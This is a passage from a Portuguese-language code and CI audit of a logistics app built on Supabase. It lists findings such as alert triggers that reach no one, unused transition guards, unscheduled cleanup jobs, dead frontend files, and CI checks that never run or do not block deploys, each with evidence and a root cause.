  Os dois triggers inserem em `alerts` e retornam, sem chamar `add_job`: supabase/migrations/20260723173506_f797adca-6a56-4477-b962-b1a865de6238.sql:48-64 → `INSERT INTO public.alerts (type, severity, title, message, metadata) VALUES ('INTEGRATION_FAILURE'::alert_type, v_severity, ...); RETURN NEW;` (trigger em :69-72, `AFTER INSERT ON public.webhook_events`, severidade CRITICAL para `SIGNATURE_INVALID`, :20-22) e supabase/migrations/20260723132258_bb348d49-2f3a-458f-885a-327cabee5179.sql:46-65 (trigger em :69-73, `AFTER INSERT ON public.lalamove_rate_limits`). O único consumidor de `alerts` é o escalonamento, que exige configuração habilitada: supabase/migrations/20261121193000_fix_escalation_pipeline.sql:40-41 → `JOIN public.alert_configurations c ON c.alert_type = a.type AND c.is_enabled = true AND c.escalation_enabled = true` — e o seed entrega INTEGRATION_FAILURE com escalonamento desligado e sem destinatário: :27 → `('INTEGRATION_FAILURE',  'email', 'Falha de Integracao',   true, false, 900, 300)` (a quarta coluna é is_enabled, a quinta escalation_enabled). Compare com o caminho que funciona: geo_emit_event enfileira explicitamente (20261122130100_geo_foundation.sql:372-383, `v_job_id := add_job('notification', ...)`).
  ```
- **Causa raiz:** Duas gerações de pipeline de alerta convivem: a antiga (trigger grava em `alerts` e espera que alguém escale) e a nova (produtor chama `add_job('notification', ...)`). Os triggers de segurança ficaram na antiga, e a correção de 21/11 deliberadamente semeou as configurações desabilitadas para não disparar backlog — o resultado combinado é que ninguém é avisado.
- **Arquivos:** `supabase/migrations/20260723173506_f797adca-6a56-4477-b962-b1a865de6238.sql`, `supabase/migrations/20260723132258_bb348d49-2f3a-458f-885a-327cabee5179.sql`, `supabase/migrations/20261121193000_fix_escalation_pipeline.sql`
- **Etapas do plano:** 039

#### M-048 — A regra de transição existe, está testada e verde, mas nenhum código de produção a chama — e o P-09 declara o problema obsoleto por causa dela

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A documentação diz que a ordem dos estados está garantida pelo sistema; na prática não há nenhuma verificação rodando, nem no banco nem no servidor. Decisões tomadas confiando nesse documento (não investir em validação de estado) estão apoiadas em algo que não existe.
- **Evidência:**
  ```
  src/lib/lalamoveGuards.ts:72-79 (`export function shouldApplyStatusTransition(current: string, incoming: string): boolean { ... if (currentRank === undefined || incomingRank === undefined) return true;`), src/types/lalamove.ts:70-75 (TERMINAL com 'CANCELED', sem 'CANCELLED') e docs/pendencias/P-09-transicoes-status-sem-check.md:5 ('Nada a corrigir; transições são regra de aplicação (código), não de schema.')
  ```
- **Causa raiz:** O guard foi escrito e coberto por teste unitário, mas nunca foi ligado ao único ponto que muda status (supabase/functions/lalamove-webhook/index.ts:318) — está em src/lib/, que a edge nem importa. Além disso a própria lógica é frouxa: TERMINAL_ORDER_STATUSES (src/types/lalamove.ts:70-75) só lista 'CANCELED' e ORDER_STATUS_RANK (linhas 58-68) não tem 'PENDING' nem 'MATCHED'; quando o posto é `undefined` a função devolve `true` (linha 78), ou seja, mesmo se fosse ligada ela liberaria 'CANCELLED' → 'ON_GOING'. O P-09 fecha a pendência afirmando que a transição é garantida pelo código, o que não se sustenta.
- **Arquivos:** `src/lib/lalamoveGuards.ts`, `src/types/lalamove.ts`, `src/lib/__tests__/lalamoveCanonical.test.ts`, `docs/pendencias/P-09-transicoes-status-sem-check.md`, `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 127

#### M-065 — Fallback temporizado entre WhatsApp e SMS está escrito e testado, mas nenhum código o usa

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quando o WhatsApp aceita a mensagem mas o motorista não lê (telefone sem internet, aparelho desligado), nada acontece: não existe o SMS de contingência depois de 10 minutos que o plano prevê. O motorista só descobre a mudança quando alguém liga. O runbook (mensageria.md:9-10) diz que o roteador resolve rota e canal, o que não é o caso.
- **Evidência:**
  ```
  supabase/functions/_shared/messaging/router.ts:132-149, :172-180, :238, :312 sem nenhum chamador fora de router.test.ts; supabase/functions/send-notification/index.ts:29-35 (imports) e :419-445 (único fallback, o imediato). Correções na evidência original: (a) applyQuietHours tem equivalente EM USO em supabase/functions/send-notification/quiet-hours.ts, importado em index.ts:17-21 — é duplicata, não regra ausente; (b) o ledger citado em docs/agentes/mensageria.md:13-14 (migration 20261125120000_notification_ledger.sql) e o `zapp-callback` de mensageria.md:16 não existem no repo (última migration: supabase/migrations/20261124120000_internal_alert_channels.sql).
  ```
- **Causa raiz:** Só o fallback imediato (etapa 91) foi ligado (index.ts:421-445). O fallback por tempo (etapa 90) e a resolução de rota evento×papel (etapa 88) ficaram como função pura sem consumidor, porque dependem de estado de envio que só o ledger `notification_messages` guardaria — e o ledger não existe.
- **Arquivos:** `supabase/functions/_shared/messaging/router.ts`, `supabase/functions/send-notification/index.ts`, `docs/agentes/mensageria.md`
- **Etapas do plano:** 147

#### M-078 — Rotinas de retenção e rollup existem mas nunca foram agendadas: logs de erro e uso de contrato crescem sem corte

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A tabela de erros de runtime e a de rate limit crescem para sempre, aumentando o custo de armazenamento e deixando as telas de observabilidade lentas; e o gráfico de tendência mensal de uso de contrato fica vazio, porque a tabela que ele lê nunca é preenchida.
- **Evidência:**
  ```
  supabase/migrations/20260723174310_cda85f06-6820-474f-ba32-909ff8ce703d.sql:25-32 → `DELETE FROM public.runtime_error_logs WHERE resolved = true AND created_at < now() - ...` / `DELETE FROM public.rate_limit_logs WHERE created_at < now() - ...`, com apenas :43-44 (REVOKE/GRANT) como demais referências; supabase/migrations/20260712195355_29d8addb-637f-453a-a340-408fab3d621b.sql:35-37 → `CREATE OR REPLACE FUNCTION public.rollup_contract_version_usage(p_retention_days integer DEFAULT 90)`; prova de que nada agendado as chama: supabase/migrations/20260109205309_5747a020-5d75-4401-a623-b5688143f754.sql:26-30 → `v_tokens_deleted := cleanup_expired_tokens();` / `v_attempts_deleted := cleanup_old_login_attempts();` (corpo completo de run_daily_cleanup).
  ```
- **Causa raiz:** As migrations que criaram as funções pararam na definição e nos grants; o agendamento foi feito em arquivos separados apenas para parte das rotinas (20260109205309, 20260712202307, 20260713110255, 20260723174804) e essas duas ficaram de fora.
- **Arquivos:** `supabase/migrations/20260723174310_cda85f06-6820-474f-ba32-909ff8ce703d.sql`, `supabase/migrations/20260712195355_29d8addb-637f-453a-a340-408fab3d621b.sql`, `src/hooks/useContractVersionUsageMonthly.ts`
- **Etapas do plano:** 171

#### M-102 — Fila do Bitrix24: o trigger enfileira a cada mudança de status, mas nada drena — só um botão manual na tela

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** As mudanças de status dos pedidos só chegam ao Bitrix24 quando alguém abre a tela e clica em processar a fila; entre um clique e outro, o CRM fica desatualizado sem nenhum aviso.
- **Evidência:**
  ```
  supabase/migrations/20251224183135_7bee6f7f-f6a0-4c50-8a8e-e08a57ff2b25.sql:14-17 (guarda que o auditor omitiu) → `SELECT * INTO sync_record FROM bitrix24_sync WHERE order_id = NEW.id LIMIT 1;` / `IF sync_record IS NOT NULL OR NEW.bitrix24_deal_id IS NOT NULL THEN`; e :19-29 + :38-42 como citado. Único dreno: src/pages/Bitrix24Page.tsx:24.
  ```
- **Causa raiz:** A fila foi desenhada como tabela de estado ('pending') sem produtor de trabalho: o trigger marca, mas a drenagem ficou dependendo de ação humana na página do Bitrix24. Nenhuma migration posterior agendou o processamento.
- **Arquivos:** `supabase/migrations/20251224183135_7bee6f7f-f6a0-4c50-8a8e-e08a57ff2b25.sql`, `src/pages/Bitrix24Page.tsx`, `supabase/functions/bitrix24-process-queue/index.ts`
- **Etapas do plano:** 218

#### M-143 — Edge geo-admin: rotação do token do Mapbox foi construída, está deployada e nunca roda — nenhum chamador, nenhuma entrada de menu, nenhum agendamento

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O token de servidor do Mapbox, que é o que gera a conta a pagar, nunca é trocado: a rotação automática que o projeto considera pronta não acontece. Se esse token vazar, não há mecanismo ativo para substituí-lo — e ainda fica um endpoint publicado em produção que ninguém usa.
- **Evidência:**
  ```
  supabase/functions/geo-admin/index.ts:68-84 (RBAC) e :94-99 (500 sem MAPBOX_TOKENS_API_TOKEN); supabase/config.toml:87-91 e o aviso :92-95; .github/workflows/ci.yml:154-155; src/hooks/useGeoAdmin.ts:70 e :336 (só geo-gateway e check-external-api); src/App.tsx:201 (/settings/maps, manager+MFA). Nenhum invoke('geo-admin') em src/ ou e2e/.
  ```
- **Causa raiz:** A etapa 9 do plano Mapbox entregou a function (com autorização correta: recheca admin/manager em geo-admin/index.ts:75-84) mas não entregou o ponto de entrada — nem botão na UI, nem job agendado, nem chamada de outra edge — e o segredo `MAPBOX_TOKENS_API_TOKEN` não está configurado (docs/planos/PLANO_MAPBOX_100_ETAPAS.md:183 registra isso). docs/qa/01-INVENTARIO.md:187 já lista `geo-admin | rotação de token Mapbox | declarado | nenhum`.
- **Arquivos:** `supabase/functions/geo-admin/index.ts`, `supabase/config.toml`, `src/hooks/useGeoAdmin.ts`, `src/pages/MapsSettingsPage.tsx`
- **Etapas do plano:** 281

#### B-009 — Oito arquivos de front (~1.900 linhas) exportados e nunca importados por ninguém, incluindo um componente marcado como placeholder

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Cerca de 1.900 linhas que parecem fazer parte do sistema e não fazem nada. Quem for pedir "melhorar o app para funcionar offline" ou "aprovar arrastando o cartão" vai ouvir que já existe — e não existe, porque nada disso está ligado em tela nenhuma.
- **Evidência:**
  ```
  8 arquivos sem importador, confirmado por grep em src/ + e2e/: src/components/approvals/SwipeableApprovalCard.tsx (500), src/hooks/useOfflineStorage.ts (290), src/hooks/useDriverEvaluations.ts (288), src/components/ui/hero-metric.tsx (293), src/components/ui/chart.tsx (332, exports ChartContainer/ChartTooltip/ChartConfig/ChartLegend sem nenhum consumidor), src/hooks/useApprovalActionsEnhanced.ts (97), src/utils/circuitBreaker.ts (59), src/components/debug/AuditReportGenerator.tsx (35, placeholder declarado na linha 7). Total 1894 linhas.
  ```
- **Causa raiz:** Funcionalidades iniciadas e abandonadas: fila offline (useOfflineStorage), cartão de aprovação por gesto (SwipeableApprovalCard + useApprovalActionsEnhanced, que depende de useAchievementsSystem — também sem uso real), disjuntor de chamadas (circuitBreaker, única implementação do tipo no repo e não plugada em nenhum fetch) e um gerador de relatório que nunca passou de esqueleto.
- **Arquivos:** `src/components/approvals/SwipeableApprovalCard.tsx`, `src/hooks/useOfflineStorage.ts`, `src/hooks/useApprovalActionsEnhanced.ts`, `src/utils/circuitBreaker.ts`, `src/components/debug/AuditReportGenerator.tsx`, `src/components/ui/hero-metric.tsx`, `src/hooks/useDriverEvaluations.ts`, `src/components/ui/chart.tsx`
- **Etapas do plano:** 164

#### B-053 — useDriver e useDriverIncidents sem nenhum consumidor (não cobertos pela triagem de órfãos)

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Código morto que um próximo agente pode ligar achando que está pronto, colocando na tela informação desatualizada de motorista.
- **Evidência:**
  ```
  src/hooks/useDrivers.ts:246-251 (useDriver, chave ['driver', id]) e src/hooks/useIncidents.ts:308-313 (useDriverIncidents, chave ['incidents','driver',driverId]); sem consumidor em src/ ou e2e/; ausentes de docs/pendencias/P-16-hooks-orfaos-triagem.md. Invalidação: useDrivers.ts:262 invalida só ['drivers'] (afeta useDriver); useIncidents.ts:320 invalida ['incidents'], que já cobre ['incidents','driver',id] por prefixo.
  ```
- **Causa raiz:** Os dois hooks de detalhe (com `fetchDriverById` e `fetchIncidentsByDriver`, usados só por eles) ficaram para trás quando a tela passou a trabalhar com a lista. Deixam ainda um efeito colateral latente no cache: as mutations de motorista invalidam apenas `['drivers']` (useDrivers.ts:265 e seguintes), nunca `['driver', id]` — se o detalhe for ligado nesse hook, nascerá mostrando dado velho depois de aprovar, bloquear ou colocar na blacklist.
- **Arquivos:** `src/hooks/useDrivers.ts`, `src/hooks/useIncidents.ts`
- **Etapas do plano:** 290


## Causa raiz: A verificação automática antes de publicar é decorativa: existe no arquivo e não impede nada

Os mecanismos de controle foram copiados de outro projeto e nunca ligados de verdade. Há cerca de 28 verificadores na pasta de controle e nenhum é executado — o que roda é só o teste desses verificadores. O comando de padronização de código nunca pode falhar, porque todas as regras foram rebaixadas a aviso. O limite mínimo de cobertura de testes nunca é aplicado, porque a cobertura não é pedida nem está instalada. Nove dos vinte e seis testes de ponta a ponta se pulam em silêncio e contam como aprovados. Toda a camada de funções de servidor (94 arquivos) está fora de qualquer verificação. E o pior: a publicação das funções em produção corre em paralelo à verificação e não espera o resultado dela.

**18 achado(s) sob esta causa.**


#### M-033 — Quatro jobs de teste de banco nao estao entre os required checks: podem ficar vermelhos sem bloquear merge

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O teste que protege a logica de chegada, atraso e avanco de parada pode estar vermelho e o merge acontece assim mesmo — o erro so aparece com o motorista na rua.
- **Evidência:**
  ```
  GET /repos/adm01-debug/Lalamove_V2/branches/main/protection -> `"contexts":["lint-and-typecheck","test","build","security","Deno Contract Tests","E2E (Playwright)","Guarda AGENTS.md / docs/agentes"], "strict": false`; ci.yml:187-191 `name: Deno Edge Function I/O Integration Tests` ... `if: github.ref == 'refs/heads/main'`; run CI/CD #987 (45079246346) conclusion `failure` com esse job unico em failure.
  ```
- **Causa raiz:** A protecao da main foi configurada com 7 contextos e os jobs de SQL/integracao foram acrescentados ao ci.yml depois, sem entrar na lista. Os proprios comentarios do ci.yml dizem que esses jobs cobrem o que mais dói — ci.yml:160-163: "O trigger geo_evaluate_tracking e o codigo que decide aproximacao, chegada, avanco de parada e atraso... uma regressao aqui... so apareceria com o motorista na rua".
- **Arquivos:** `.github/workflows/ci.yml`
- **Etapas do plano:** 112

#### M-034 — Tres suites Deno existem no repo e nenhum job as executa

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Regra de arredondamento de coordenada, normalizacao de telefone de motorista e a ponte com o banco externo tem teste escrito e nunca verificado — podem quebrar sem a CI reclamar.
- **Evidência:**
  ```
  .github/workflows/ci.yml:134 `run: deno test supabase/functions/_shared/messaging/` e :139 `run: deno test supabase/functions/_shared/channels/` — nenhum passo roda a raiz de `_shared/`. Arquivos orfaos: supabase/functions/_shared/geo-precision.test.ts (3 Deno.test), supabase/functions/_shared/phone.test.ts (17), supabase/functions/external-db-bridge/index.test.ts (24).
  ```
- **Causa raiz:** O ci.yml lista alvos um a um e por diretorio; arquivos novos na raiz de `_shared/` e em functions sem diretorio citado nao entram. O guarda que deveria pegar isso (scripts/ci/check-test-inventory.mjs) nao roda na CI — e, quando rodei, acusou 24 arquivos, dos quais 21 sao falso-positivo: ele nao credita cobertura por `deno test <dir>/`, apesar de scripts/ci/README.md prometer "(ou coberto pelo glob)".
- **Arquivos:** `.github/workflows/ci.yml`, `supabase/functions/_shared/geo-precision.test.ts`, `supabase/functions/_shared/phone.test.ts`, `supabase/functions/external-db-bridge/index.test.ts`, `scripts/ci/check-test-inventory.mjs`
- **Etapas do plano:** 113

#### M-039 — Os dois ratchets de tipo têm baseline desatualizado: 17 erros já corrigidos continuam na lista de perdoados e podem voltar com a CI verde

- **Camada:** Transversal — código morto e duplicação (+ 1 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A rede de proteção automática está com 17 buracos pré-aprovados. Se qualquer um daqueles 17 erros voltar — por exemplo os de validação de senha e de login em AuthPage/ResetPasswordPage — a verificação passa verde e o problema chega em produção sem aviso.
- **Evidência:**
  ```
  Saída executada agora: typecheck-ratchet.mjs 'baseline=17, atual=1, removidas=17, novas=1'; implicit-any-ratchet.mjs 'implicit-any errors: 0 (baseline: 2)'. scripts/ci/implicit-any-baseline.json = `{"baseline": 2}`; scripts/ci/typecheck-baseline.json com 17 issues (ex.: src/components/map/hooks/useMapMarkers.ts:217 TS2503). package.json:98 (xlsx via cdn.sheetjs.com) e ausência de node_modules/xlsx explicam o único erro 'novo'.
  ```
  Mesma causa, outro local — Infra, CI e deploy:
  ```
  scripts/ci/typecheck-baseline.json:3; scripts/ci/a11y-button-name-baseline.json:2; scripts/ci/implicit-any-baseline.json:2; .github/workflows/ci.yml:24-25; `node scripts/ci/bundle-budget.mjs` EXIT=2; grep ratchet|bundle-budget em .github/workflows/ = 0 hits.
  ```
- **Causa raiz:** Os ratchets só falham com erro NOVO: scripts/ci/typecheck-ratchet.mjs compara por `(arquivo,linha,código)+contextHash` e imprime "OK: nenhum novo erro de tipo foi introduzido" (:355). Dívida corrigida não baixa o baseline sozinha, e ninguém baixou: as 17 entradas foram todas eliminadas (`removidas=17`) e continuam no arquivo, assim como o `baseline: 2` de implicit-any com 0 erros reais.
- **Arquivos:** `.github/workflows/ci.yml`, `scripts/ci/a11y-button-name-baseline.json`, `scripts/ci/bundle-budget.mjs`, `scripts/ci/implicit-any-baseline.json`, `scripts/ci/implicit-any-ratchet.mjs`, `scripts/ci/typecheck-baseline.json`, `scripts/ci/typecheck-ratchet.mjs`
- **Etapas do plano:** 118
- **Divergência entre revisores:** um revisor refutou e outro confirmou: CONFIRMA: Reexecutei os dois scripts agora. `node scripts/ci/typecheck-ratchet.mjs` → 'Typecheck ratchet: baseline=17, atual=1, removidas=17, novas=1' (a única nova é `src/utils/exportUtils.ts(5,23) TS2307 Cannot find module 'xlsx'`). `node scripts/ci/implicit-any-ratchet.mjs` → 'implicit-any errors: 0 (basel || REFUTA: EXECUTADO e REFUTADO no mecanismo. Os fatos de contagem conferem: `node scripts/ci/typecheck-ratchet.mjs` → `Typecheck ratchet: baseline=17, atual=1, removidas=17, novas=1`, e scripts/ci/implicit-any-baseline.json contém só `{ "baseline": 2 }`. Mas a consequência do título — "podem voltar com a CI v

#### M-040 — Toda a camada de edge functions está fora do lint e de qualquer verificação de tipo na CI: 94 arquivos .ts sem análise estática, apesar dos 7 checks obrigatórios

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A parte do sistema que fala com a Lalamove, com o Mapbox e com o Bitrix24 — onde um erro significa pedido não criado ou rastreamento parado — é a única parte que nenhuma verificação automática olha. A CI pode estar toda verde com uma edge que não compila, e o erro só aparece quando um pedido real falha em produção.
- **Evidência:**
  ```
  eslint.config.js:8; tsconfig.app.json `include: ["src"]`; tsconfig.node.json:21; .github/workflows/ci.yml:22-24 (os dois únicos tsc) e :116-155 (só `deno test`); 94 arquivos .ts em supabase/functions.
  ```
- **Causa raiz:** O ESLint foi configurado para ignorar a pasta das edges (provavelmente porque elas usam imports de URL e a global `Deno`, que o parser do front não entende) e nunca foi substituído por `deno check`/`deno lint` na CI. O tsconfig do app só inclui `src`. Resultado: nenhum dos 7 checks obrigatórios da main compila as edges.
- **Arquivos:** `eslint.config.js`, `tsconfig.app.json`, `.github/workflows/ci.yml`, `scripts/ci/implicit-any-ratchet.mjs`
- **Etapas do plano:** 119

#### M-087 — 24 referencias de GitHub Action por tag mutavel e 2 actions fora da allowlist

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O sistema confia em codigo de terceiros que pode mudar sem aviso dentro do processo que tem a chave do banco de producao.
- **Evidência:**
  ```
  Saida de `node scripts/ci/check-workflow-pins.mjs` (EXIT=1) com 24 referencias mutaveis e 2 repos nao autorizados; .github/workflows/deploy-edges.yml:27 `SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}` e :35 `uses: supabase/setup-cli@v1`; scripts/ci/allowed-actions.json:4-12 (patterns so `actions/*` + `denoland/setup-deno`).
  ```
- **Causa raiz:** ci.yml, apply-migrations.yml e deploy-edges.yml ficaram com tags flutuantes enquanto contexto.yml e inventario-estado-semanal.yml foram pinados por SHA. Tag e um ponteiro mutavel: quem controla o repositorio da Action (ou um invasor que comprometa a conta) troca o alvo da tag e passa a executar codigo arbitrario dentro do job — inclusive no job `deploy` de deploy-edges.yml, que tem `SUPABASE_ACCESS_TOKEN` no ambiente. Alem disso `supabase/setup-cli` e `peter-evans/create-pull-request` (inventario-estado-semanal.yml:92) nao constam de scripts/ci/allowed-actions.json, cujos `patterns` listam so `actions/*` e `denoland/setup-deno` — a allowlist esta desatualizada em relacao ao que os workflows realmente usam.
- **Arquivos:** `.github/workflows/ci.yml`, `.github/workflows/apply-migrations.yml`, `.github/workflows/deploy-edges.yml`, `.github/workflows/inventario-estado-semanal.yml`, `scripts/ci/allowed-actions.json`
- **Etapas do plano:** 182

#### M-138 — Nenhum dos ~28 guardas de scripts/ci/ roda na CI: o ci.yml executa somente os testes dos guardas

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O repositorio tem um painel de alarmes bonito e desligado: quem olha a CI verde acredita que supply chain, segredos, tamanho de bundle, cobertura de teste e divida de lint estao sob controle, e nenhum deles e conferido quando uma mudanca entra.
- **Evidência:**
  ```
  .github/workflows/ci.yml:95-97 — `CLAUDE_MD_BASE=origin/main node scripts/ci/check-agents-md-integrity.mjs` / `- name: Testa o lint de mensagem de commit` / `run: node --test scripts/ci/*.unit.mjs`; scripts/ci/README.md:15 — "**Nenhum destes guardas está ligado ao `.github/workflows/ci.yml` ainda.**"
  ```
- **Causa raiz:** Os guardas foram portados do Zapp Web V2 sem o passo de ligacao no ci.yml (o README alega bloqueio pela PR #81). O job `guard-agents-md` roda `node --test scripts/ci/*.unit.mjs`, que executa os testes unitarios DOS guardas — eles passam sempre, porque testam fixtures sinteticas, nao o repositorio. Resultado: ~200 KB de codigo de guarda + 7 baselines sem efeito nenhum sobre merge.
- **Arquivos:** `.github/workflows/ci.yml`, `.github/workflows/contexto.yml`, `.github/workflows/inventario-estado-semanal.yml`, `scripts/ci/README.md`, `scripts/ci/check-workflow-pins.mjs`, `scripts/ci/check-test-inventory.mjs`, `scripts/ci/lint-ratchet.mjs`, `scripts/ci/render-workflow-docs.mjs`, `scripts/ci/gerar-matriz-edge-tabela.mjs`, `scripts/ci/bundle-budget.mjs`
- **Etapas do plano:** 274, 275, 276

#### M-139 — O job security so quebra em vulnerabilidade critica: high passa verde

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma falha de seguranca grave numa biblioteca do sistema pode entrar em producao com o selo verde da CI.
- **Evidência:**
  ```
  .github/workflows/ci.yml:108 `      - run: npm audit --audit-level=critical`. Estado atual medido: `npm audit --audit-level=critical` → `found 0 vulnerabilities`. package.json:98 `"xlsx": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"`.
  ```
- **Causa raiz:** `--audit-level=critical` faz o npm sair com codigo 0 para tudo que for `high` ou menos. Rodei `npm audit --json` agora: 0 vulnerabilidades em 873 dependencias (647 prod), entao hoje nao ha divida — mas o portao esta um degrau abaixo do que deveria, e um CVE `high` em dependencia de producao (Supabase JS, mapbox-gl, react-router) entra sem alarme. Soma-se ao achado do xlsx: dependencia por URL nem chega a ser auditada.
- **Arquivos:** `.github/workflows/ci.yml`, `package.json`
- **Etapas do plano:** 277

#### M-140 — deploy das edge functions em producao nao depende da CI: contract test vermelho nao impede o deploy

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma correcao de edge function com defeito vai para producao mesmo com os testes dela vermelhos: pedido, rastreamento ou mensagem para o motorista podem quebrar em producao enquanto a CI ainda esta rodando.
- **Evidência:**
  ```
  .github/workflows/deploy-edges.yml:11-17 — `on:` / `push:` / `branches: [main]` / `paths:` ... / `workflow_dispatch:`; :23-25 — `jobs:` / `deploy:` / `runs-on: ubuntu-latest`; :47 — `run: supabase functions deploy --yes --project-ref "$PROJECT_REF"`. Protecao que o auditor nao considerou: API de branch protection da main devolve `"contexts":["lint-and-typecheck","test","build","security","Deno Contract Tests","E2E (Playwright)","Guarda AGENTS.md / docs/agentes"]` com `"strict":false` e `"enforce_admins":{"enabled":true}`.
  ```
- **Causa raiz:** deploy-edges.yml e um workflow independente disparado pelo mesmo push que dispara o ci.yml. Os dois correm em paralelo; o deploy nao espera nem consulta o resultado do job `Deno Contract Tests` (ci.yml:110-155), que e justamente quem prova webhook/HMAC, roteamento do gateway, orcamento do geo-gateway e a mensageria com motorista. Branch protection so barra o merge — depois do merge o push na main ja aconteceu e o deploy sai.
- **Arquivos:** `.github/workflows/deploy-edges.yml`, `.github/workflows/ci.yml`
- **Etapas do plano:** 278

#### M-145 — O guard que detecta teste órfão falha hoje (exit 1) e nenhum workflow o executa

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Existem testes escritos, pagos em horas de trabalho, que nunca rodam — inclusive o da ponte com o banco externo. Quem lê "CI verde" acha que eles passaram. É exatamente o problema que os comentários do próprio ci.yml (linhas 136-142) dizem ter corrigido antes: "existia e nenhum workflow executava".
- **Evidência:**
  ```
  scripts/ci/check-test-inventory.mjs:189-194 `export function orfaosDeno() { const noDisco = ... ; if (ciYaml.includes(CI_TS_GLOB)) return []; const citados = new Set([...ciYaml.matchAll(/\bsupabase\/functions\/\S+\.test\.ts\b/g)]...); return noDisco.filter((f) => !citados.has(f)); }` · :95 `const CI_TS_GLOB = 'supabase/functions/**/*.test.ts';` · :93 `export const ALLOWLIST_NODE = new Set();` · .github/workflows/ci.yml:97 `run: node --test scripts/ci/*.unit.mjs` (única chamada de guard além de :95).
  ```
- **Causa raiz:** O guard foi portado para o repo mas nunca ligado a um passo de CI, e desde então a lista de testes no disco cresceu além do que o ci.yml cita. Como ninguém o executa, os 48 órfãos (dos quais ~22 são órfãos de verdade) ficaram invisíveis.
- **Arquivos:** `scripts/ci/check-test-inventory.mjs`, `.github/workflows/ci.yml`, `supabase/functions/_shared/geo-precision.test.ts`, `supabase/functions/_shared/phone.test.ts`, `supabase/functions/external-db-bridge/index.test.ts`
- **Etapas do plano:** 283

#### M-146 — Suíte órfã com teste vermelho há tempo indeterminado: baseline congelada de assinaturas realtime não bate mais com o código

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Prova concreta de que teste órfão não é só desperdício: existe um teste quebrado no repositório e ninguém soube. Pior, ele é o guard que avisaria se alguém criasse uma nova assinatura de tempo real que não recebe evento nenhum — ou seja, tela que parece ao vivo e fica parada. Enquanto ele estiver vermelho por motivo errado, não dá para ligá-lo à CI.
- **Evidência:**
  ```
  scripts/db-audit/check-realtime-subscriptions.test.mjs:136-141 `const ASSINATURAS_MORTAS_CONHECIDAS = ['public.auth_logs','public.blocked_ips','public.mfa_sessions','public.new_device_alerts'];` e :147 `assert.deepEqual(result.absentFromPublication, ASSINATURAS_MORTAS_CONHECIDAS);`; o conjunto esvaziou por causa de supabase/migrations/20261109004100_add_security_tables_to_realtime.sql:4 `ALTER PUBLICATION supabase_realtime ADD TABLE public.new_device_alerts;` (:5 blocked_ips, :6 auth_logs, :7 mfa_sessions), não por remoção no src — as assinaturas seguem em src/hooks/useSecurityPushNotifications.ts:115,138,160,185.
  ```
- **Causa raiz:** O teste congela o conjunto exato de assinaturas realtime "mortas" conhecidas. Essas quatro assinaturas foram removidas do src desde então, `result.absentFromPublication` virou `[]`, e a lista esperada não foi atualizada. Como nenhum workflow roda scripts/db-audit/ (.github/workflows/ci.yml:97 só cobre scripts/ci/*.unit.mjs), o vermelho nunca apareceu.
- **Arquivos:** `scripts/db-audit/check-realtime-subscriptions.test.mjs`, `.github/workflows/ci.yml`
- **Etapas do plano:** 284

#### B-011 — A quarentena de E2E não exclui nada: o playwright.config.ts não tem testIgnore e o guard que cobra prazo não roda na CI

- **Camada:** Testes
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
